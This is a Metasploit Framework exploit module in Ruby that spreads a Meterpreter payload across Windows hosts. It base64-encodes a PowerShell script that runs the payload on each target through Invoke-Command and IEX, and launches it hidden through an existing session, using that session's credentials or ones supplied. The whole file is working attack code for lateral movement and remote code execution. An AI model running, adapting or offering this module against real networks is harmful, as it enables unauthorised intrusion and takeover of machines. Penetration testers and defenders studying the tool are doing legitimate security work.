##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::Powershell

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Powershell Remoting Remote Command Execution',
        'Description'   => %q{
          This module executes powershell on the remote host using the current
          user credentials or those supplied. Instead of using PSEXEC over TCP
          port 445 we use the WMIC command to start a Remote Procedure Call on
          TCP port 135 and an ephemeral port. Set ReverseListenerComm to tunnel
          traffic through that session.

          The result is similar to psexec but with the added benefit of using
          the session's current authentication token instead of having to know
          a password or hash.

          We do not get feedback from the WMIC command so there are no
          indicators of success or failure. The remote host must be configured
          to allow remote Windows Management Instrumentation.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
            'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'
          ],
        'References'    =>
          [
            [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
            [ 'OSVDB', '3106'],
          ],
        'DefaultOptions' =>
            {
                'EXITFUNC' => 'thread',
                'WfsDelay' => '15',
            },
        'DisclosureDate' => 'Jan 01 1999',
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ],
        'Targets'	=>
        [
            [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
            [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
        'DefaultTarget' => 0
      ))

    register_options([
      OptString.new('SMBUser', [ false, 'The username to authenticate as' ]),
      OptString.new('SMBPass', [ false, 'The password for the specified username' ]),
      OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication' ]),
      OptAddressRange.new("RHOSTS", [ true, "Target address range or CIDR identifier" ]),
      # Move this out of advanced
      OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener'])
    ])
  end

  def exploit
    if datastore['SMBUser'] and datastore['SMBPass'].nil?
      fail_with(Failure::BadConfig, "Need both username and password set.")
    end

    ip_list = "$iplist = "
    Rex::Socket::RangeWalker.new(datastore["RHOSTS"]).each do |ip|
      ip_list << "\"#{ip}\","
    end

    # Remove trailing comma...
    ip_list = ip_list[0..-2]

    f = Msf::Util::EXE.to_win32pe_psh_net(framework, payload.encoded)
    encoded = compress_script(f)

    command = "powershell.exe -e #{encoded}"
    ps =<<EOF
$ResultList = @()
#{ip_list}
foreach ($ip in $iplist)
{
  $Resultlist += [System.Net.Dns]::GetHostbyAddress($ip).HostName
}

Invoke-Command -ComputerName $ResultList -ScriptBlock {IEX '#{command}'}
EOF
    puts ps
    ps = Rex::Text.to_unicode(ps)
    ps = Rex::Text.encode_base64(ps)

    session.sys.process.execute("powershell.exe -e #{ps}", "", {'Hidden' => true, 'Channelized' => false})
    stime = Time.now.to_f
    print_status "Starting the payload handler..."
    while(true)
      select(nil,nil,nil,1)
    end
  end

  def wmic_user_pass_string(domain=datastore['SMBDomain'], user=datastore['SMBUser'], pass=datastore['SMBPass'])
    userpass = ""

    unless user.nil?
      if domain.nil?
        userpass = "/user:\"#{user}\" /password:\"#{pass}\" "
      else
        userpass = "/user:\"#{domain}\\#{user}\" /password:\"#{pass}\" "
      end
    end

    return userpass
  end

end

